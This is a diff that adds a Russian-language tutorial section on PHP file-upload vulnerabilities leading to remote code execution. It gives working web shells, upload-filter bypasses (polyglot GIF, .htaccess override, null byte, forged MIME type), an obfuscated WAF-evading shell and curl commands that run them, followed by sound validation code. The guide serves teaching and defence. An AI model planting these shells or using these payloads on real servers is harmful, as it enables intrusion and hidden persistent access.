@@ -9,6 +9,7 @@
    - [1. PHP Code Injection (eval, assert, create_function)](#1-php-code-injection-eval-assert-create_function)
    - [2. File Inclusion (include, require)](#2-file-inclusion-include-require)
    - [3. Command Injection (system, exec, shell_exec)](#3-command-injection-system-exec-shell_exec)
+   - [4. File Upload + RCE (комбинированная атака)](#4-file-upload--rce-комбинированная-атака)
 4. [Методы эксплуатации](#методы-эксплуатации)
    - [RFI (Remote File Inclusion)](#rfi-remote-file-inclusion)
    - [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
@@ -401,6 +402,188 @@ exec("mysqldump -u root -p'pass' $db > backup.sql");
 - Латеральное движение по сети (атака других серверов)
 - Кража SSL сертификатов и приватных ключей
 - Модификация системы для скрытия присутствия
+
+---
+
+#### 4. **File Upload + RCE (комбинированная атака)**
+
+**Важно:** Это **НЕ** чистая PHP Injection, а комбинация уязвимостей. File Upload сам по себе - отдельная категория (Unrestricted File Upload), но в связке с PHP часто приводит к RCE.
+
+**Суть уязвимости:**
+
+Механизм загрузки файлов не валидирует должным образом тип, содержимое или расширение файлов. Атакующий загружает файл с PHP кодом на сервер, затем обращается к нему через URL или комбинирует с LFI. Сервер интерпретирует загруженный файл как PHP код и выполняет его.
+
+**Типичные сценарии возникновения:**
+- Аватары пользователей, галереи изображений
+- Системы загрузки документов (резюме, отчеты)
+- Импорт данных (CSV, XML обработка)
+- Backup/restore функциональность
+- Любая загрузка файлов без должной валидации
+
+**Техническая суть:** Загрузка PHP файла → доступ к нему через веб-сервер → Apache/Nginx интерпретирует .php → код выполняется.
+
+**Уязвимый код:**
+```php
+// Пример 1: Загрузка без проверок
+$uploadDir = 'uploads/';
+$uploadFile = $uploadDir . basename($_FILES['file']['name']);
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
+// ОПАСНО: любой файл, включая .php!
+
+// Пример 2: Проверка только MIME type (легко обойти)
+if ($_FILES['file']['type'] == 'image/jpeg') {
+    move_uploaded_file($_FILES['file']['tmp_name'], 'avatars/' . $_FILES['file']['name']);
+}
+// ОПАСНО: MIME type контролируется клиентом!
+
+// Пример 3: Слабая валидация расширения
+$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
+if (in_array($ext, ['jpg', 'png', 'gif'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], 'images/' . $_FILES['file']['name']);
+}
+// Может быть обойдено через .php.jpg или case-sensitivity
+```
+
+**Реальная эксплуатация:**
+
+**1. Прямая загрузка PHP shell:**
+```php
+// shell.php
+<?php system($_GET['cmd']); ?>
+```
+```bash
+# Загружаем через форму, затем:
+curl http://site.com/uploads/shell.php?cmd=whoami
+```
+
+**2. Обход через двойное расширение:**
+```bash
+# Загружаем файл: shell.php.jpg
+# Некоторые серверы могут обработать как PHP
+curl http://site.com/uploads/shell.php.jpg?cmd=id
+```
+
+**3. Обход через null byte (PHP < 5.3.4):**
+```bash
+# Имя файла: shell.php%00.jpg
+# PHP обрежет после %00, файл сохранится как shell.php
+```
+
+**4. Обход через Content-Type manipulation:**
+```bash
+POST /upload.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg    # ← Подделываем MIME type
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+```
+
+**5. Обход через case-sensitivity (Windows серверы):**
+```bash
+# Загружаем: shell.PhP или shell.pHp
+# Windows не различает регистр расширений
+```
+
+**6. Комбинация File Upload + LFI:**
+```php
+// Загружаем файл с PHP кодом под безопасным расширением
+// Имя файла: backdoor.txt
+// Содержимое: <?php system($_GET['c']); ?>
+
+// Затем используем LFI:
+?page=uploads/backdoor.txt&c=whoami
+// include() выполнит PHP код из .txt файла!
+```
+
+**7. Phar + File Upload (advanced):**
+```bash
+# Создаём .phar с вредоносным объектом
+# Загружаем как .jpg (обходим фильтры)
+# Затем используем phar wrapper:
+?file=phar://uploads/image.jpg/test
+# Десериализация → RCE
+```
+
+**8. Polyglot файлы (PHP + image):**
+```bash
+# Создаём файл который является валидным изображением И PHP кодом
+echo "GIF89a" > shell.gif              # GIF header
+echo '<?php system($_GET["c"]); ?>' >> shell.gif
+
+# Проходит проверку как изображение, но PHP интерпретирует код
+# Доступ: /uploads/shell.gif?c=whoami
+```
+
+**9. .htaccess upload для изменения конфигурации:**
+```apache
+# Загружаем .htaccess в директорию uploads/
+AddType application/x-httpd-php .jpg
+
+# Теперь все .jpg файлы обрабатываются как PHP!
+# Загружаем shell.jpg с PHP кодом → выполняется
+```
+
+**10. Web shell обфускация:**
+```php
+// Обход сканеров и WAF
+<?php
+$a = str_rot13('flfgrz');  // system
+$b = $_GET[base64_decode('Y21k')];  // cmd
+$a($b);
+?>
+```
+
+**Техники валидации (что проверять):**
+
+**Слабые методы (легко обойти):**
+- ❌ MIME type (`$_FILES['file']['type']`) - контролируется клиентом
+- ❌ Расширение без whitelist - легко обойти через .php5, .phtml
+- ❌ Проверка только первых байтов - polyglot файлы
+
+**Правильные методы:**
+```php
+// 1. Whitelist расширений + переименование
+$allowed = ['jpg', 'jpeg', 'png', 'gif'];
+$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) {
+    die('Invalid file type');
+}
+$newName = bin2hex(random_bytes(16)) . '.' . $ext;  // Случайное имя
+move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $newName);
+
+// 2. Проверка содержимого через getimagesize()
+$check = getimagesize($_FILES['file']['tmp_name']);
+if ($check === false) {
+    die('Not a valid image');
+}
+
+// 3. Изоляция uploads директории
+// Запретить выполнение PHP в uploads/ через .htaccess:
+php_flag engine off
+
+// 4. Хранение вне web root
+move_uploaded_file($_FILES['file']['tmp_name'], '/var/data/uploads/' . $newName);
+// Доступ только через специальный скрипт, который отдаёт файл
+```
+
+**Практическая опасность:**
+- Полный RCE через загрузку веб-шелла
+- Backdoor с постоянным доступом
+- Defacement сайта
+- Загрузка malware для атак на пользователей
+- Использование сервера для phishing/spam
+- Хранение нелегального контента на сервере жертвы
+
+**Индикаторы уязвимости при тестировании:**
+- Загруженный .php файл доступен по прямому URL
+- Можно загрузить файл с произвольным расширением
+- Нет рандомизации имён файлов
+- Uploads директория имеет execute права
+- .htaccess можно загрузить и он обрабатывается
 
 ---
 
